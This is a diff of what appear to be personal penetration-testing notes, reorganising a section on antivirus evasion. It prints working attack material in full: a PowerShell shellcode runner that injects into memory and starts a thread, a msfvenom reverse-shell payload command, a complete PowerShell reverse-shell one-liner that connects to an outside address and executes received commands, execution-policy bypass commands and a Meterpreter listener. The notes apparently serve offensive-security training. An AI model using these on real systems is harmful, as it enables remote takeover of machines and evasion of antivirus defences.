@@ -17,9 +17,11 @@ mkdir mywebdav
 .local/wsgidav --host=0.0.0.0 --auth=anonymous --port 80 --root ./mywebdav
 ```
 
-## AV
+## AV evasion
 
 ### Powershell
+
+#### Basics
 
 Get help:
 
@@ -40,7 +42,7 @@ Base64: https://stackoverflow.com/questions/15414678/how-to-decode-a-base64-stri
 [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("sometext"))
 ```
 
-Memory injection
+#### Memory injection
 
 - https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process
 - https://blog.f-secure.com/memory-injection-like-a-boss/
@@ -73,13 +75,12 @@ for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i
 $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 ```
 
-### Shell code
-
+Shell code:
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=$AttackerIp LPORT=$AttackerPort -f powershell -v sc
+kali$ msfvenom -p windows/shell_reverse_tcp LHOST=$AttackerIp LPORT=$AttackerPort -f powershell -v sc
 ```
 
-### One-liner
+#### Reverse shell one-liner
 
 - source: https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
 - command:
@@ -87,16 +88,31 @@ msfvenom -p windows/shell_reverse_tcp LHOST=$AttackerIp LPORT=$AttackerPort -f p
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 - base64: https://github.com/darkoperator/powershell_scripts/blob/master/README
-- execution policy (see ByPAss): https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.3
+
+#### Execution policy
+
+See ByPass: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.3
+
+##### At system level
+
+```
+Get-ExecutionPolicy -Scope CurrentUser
+Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+```
+
+##### At script level
+
+```
+PS> powershell -ep bypass ./somescript.ps1
+```
 
 ## Shellter
 
-- link: https://www.shellterproject.com/
+Project: https://www.shellterproject.com/
 
-### Msf listener
-
+Metasploit listener:
 ```
-msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $AttackerIP;set LPORT $AttackerPort;run;"
+kali$ msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $AttackerIP;set LPORT $AttackerPort;run;"
 ```
 
 
